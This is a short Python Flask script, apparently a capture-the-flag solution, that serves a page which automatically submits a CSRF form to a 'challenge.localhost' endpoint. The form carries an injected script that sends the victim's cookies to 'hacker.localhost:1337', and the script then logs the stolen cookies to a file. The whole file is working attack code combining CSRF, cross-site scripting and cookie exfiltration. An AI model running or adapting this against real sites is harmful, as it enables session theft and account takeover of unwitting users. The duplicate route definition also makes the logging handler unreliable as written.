from flask import Flask, request

app = Flask(__name__)

@app.route("/")
def index():
    # Serve the CSRF page to the victim
    return """
        <html>
        <body>
            <h1>Attack in progress...</h1>
            <form id="csrfForm" action="http://challenge.localhost:80/ephemeral" method="GET">
                <input type="hidden" name="msg" value='<script>
                    fetch(`http://hacker.localhost:1337/?cookie=${encodeURIComponent(document.cookie)}`);
                </script>'>
            </form>
            <script>
                document.getElementById("csrfForm").submit();
            </script>
        </body>
        </html>
    """

@app.route("/", methods=["GET"])
def log_cookies():
    # Capture and log cookies received from the victim
    victim_cookie = request.args.get("cookie")
    if victim_cookie:
        print(f"Stolen Cookie: {victim_cookie}")
        with open("stolen_cookies.log", "a") as f:
            f.write(f"Stolen Cookie: {victim_cookie}\n")
        return f"Cookie stolen! Full cookie: {victim_cookie}"
    return "No cookie received yet. Waiting for victim..."

if __name__ == "__main__":
    print("Starting hacker server at http://hacker.localhost:1337/")
    app.run(host="0.0.0.0", port=1337)
